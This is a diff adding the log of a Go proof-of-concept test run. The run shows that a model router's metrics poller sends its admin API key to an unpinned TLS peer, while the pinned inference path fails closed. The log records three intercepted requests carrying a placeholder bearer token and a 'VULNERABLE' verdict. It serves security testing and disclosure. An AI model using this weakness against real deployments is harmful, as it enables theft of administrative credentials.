@@ -1,0 +1,16 @@
+=== RUN   TestPoC_MetricsPollLeaksAdminKeyToUnpinnedPeer
+time="2026-10-08T01:12:32Z" level=info msg="starting vLLM metrics polling" clear_requests_waiting=4 enclave=gpu-1.inf6.example max_requests_waiting=8 model=llama3-3-70b retry_after_minutes=1
+2026/10/08 01:12:32 http: TLS handshake error from 127.0.0.1:50334: remote error: tls: bad certificate
+time="2026-10-08T01:12:32Z" level=error msg="proxy error" enclave=gpu-1.inf6.example error="certificate fingerprint mismatch" model=llama3-3-70b reason=tls_mismatch
+    poc_metrics_unpinned_test.go:166: control: proxied inference request through pinned transport -> HTTP 502 {"error":{"message":"The server had an error while processing your request.","type":"server_error","param":null,"code":"upstream_error"}}
+    poc_metrics_unpinned_test.go:173: attested enclave TLS key fingerprint: 2d238bf7aced8d4821e9e230958f4297ba5a8728a519ad39e6d7bb9d1a02602f
+    poc_metrics_unpinned_test.go:174: attacker TLS key fingerprint:         5e120b6ae2a1c0cb4a31ef2a3a95ae76fb541d02df1a7a6dd0a68b8db38ac2a6
+    poc_metrics_unpinned_test.go:175: attacker received 3 request(s)
+    poc_metrics_unpinned_test.go:178:   #0 path=/metrics authorization="Bearer tk_ADMIN_METRICS_API_KEY_SECRET_do_not_leak" (client presented no certificate; server key is the attacker's)
+    poc_metrics_unpinned_test.go:178:   #1 path=/metrics authorization="Bearer tk_ADMIN_METRICS_API_KEY_SECRET_do_not_leak" (client presented no certificate; server key is the attacker's)
+    poc_metrics_unpinned_test.go:178:   #2 path=/metrics authorization="Bearer tk_ADMIN_METRICS_API_KEY_SECRET_do_not_leak" (client presented no certificate; server key is the attacker's)
+    poc_metrics_unpinned_test.go:192: VULNERABLE: METRICS_API_KEY ("tk_ADMIN_METRICS_API_KEY_SECRET_do_not_leak") was sent to a TLS peer whose key (5e120b6ae2a1c0cb...) is not the attested key (2d238bf7aced8d48...); the pinned proxy path to the same host failed closed (502)
+time="2026-10-08T01:12:34Z" level=info msg="stopped vLLM metrics polling" enclave=gpu-1.inf6.example model=llama3-3-70b
+--- PASS: TestPoC_MetricsPollLeaksAdminKeyToUnpinnedPeer (2.52s)
+PASS
+ok  	github.com/tinfoilsh/confidential-model-router/manager	2.534s
